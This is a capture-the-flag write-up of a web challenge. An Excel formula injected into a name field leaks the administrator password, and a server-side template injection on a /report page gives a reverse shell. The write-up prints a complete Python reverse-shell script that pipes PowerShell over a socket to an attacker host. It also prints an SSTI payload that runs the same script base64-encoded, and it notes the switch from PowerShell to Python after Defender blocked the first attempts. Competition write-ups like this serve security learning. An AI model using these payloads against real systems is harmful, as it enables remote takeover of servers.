## Summary
This challenge involved leveraging an Excel-based database for credential extraction. After gaining access as Administrator, a server-side template injection (SSTI) vulnerability was exploited to obtain reverse shell.
## Access to Administrator
The first step in this challenge is to determine the serverâ€™s backend, which appeared to use Excel. By sending the input `" , "`, an Excel error message is returned, confirming the use of Excel as the database.\

With Excel confirmed as the backend, it is possible to retrieve the Admin password using an Excel formula. By setting the name field to =$C1, which references the C1 column, the password of the Administrator user is revealed.\

The password is revealed after logging in as the user.\
![username](./assets/username.png)\
It is now possible to log in as the Admin user.\
![admin](./assets/admin.png)\
## Reverse shell in SSTI
After logging in as Admin, is is possible to access the /report page. An SSTI vulnerability is identified by entering the payload `{{7*7}}` as the name while registerring a user.\

During the competition, we first attempted to use PowerShell for a reverse shell, but these attempts were caught by Defender AntiVirus. However, switching to Python is simpler. The following payload is used for reverse shell
```
import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("INSERT IP",PORT))

p=subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```
To execute this payload via SSTI, the script is base64-encoded and embedded into the following payload:
```
{{dict.__base__.__subclasses__()[544](["python", "-c", "import base64;exec(base64.b64decode('aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzLHRocmVhZGluZzsKZGVmIHMycChzLCBwKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgZGF0YSA9IHMucmVjdigxMDI0KQogICAgICAgIGlmIGxlbihkYXRhKSA+IDA6CiAgICAgICAgICAgIHAuc3RkaW4ud3JpdGUoZGF0YSkKICAgICAgICAgICAgcC5zdGRpbi5mbHVzaCgpCgpkZWYgcDJzKHMsIHApOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBzLnNlbmQocC5zdGRvdXQucmVhZCgxKSkKCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjEyOC4yLjI1IiwxMzM3KSkKCnA9c3VicHJvY2Vzcy5Qb3BlbihbInBvd2Vyc2hlbGwiXSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VULCBzdGRpbj1zdWJwcm9jZXNzLlBJUEUpCgpzMnBfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9czJwLCBhcmdzPVtzLCBwXSkKczJwX3RocmVhZC5kYWVtb24gPSBUcnVlCnMycF90aHJlYWQuc3RhcnQoKQoKcDJzX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXAycywgYXJncz1bcywgcF0pCnAyc190aHJlYWQuZGFlbW9uID0gVHJ1ZQpwMnNfdGhyZWFkLnN0YXJ0KCkKCnRyeToKICAgIHAud2FpdCgpCmV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgIHMuY2xvc2UoKQ=='.encode()).decode())"], stdout=-1).communicate()[0]}}
```
After setting up a netcat listener on the eptbox and refreshing the /report page, we have shell as the user Charles.\
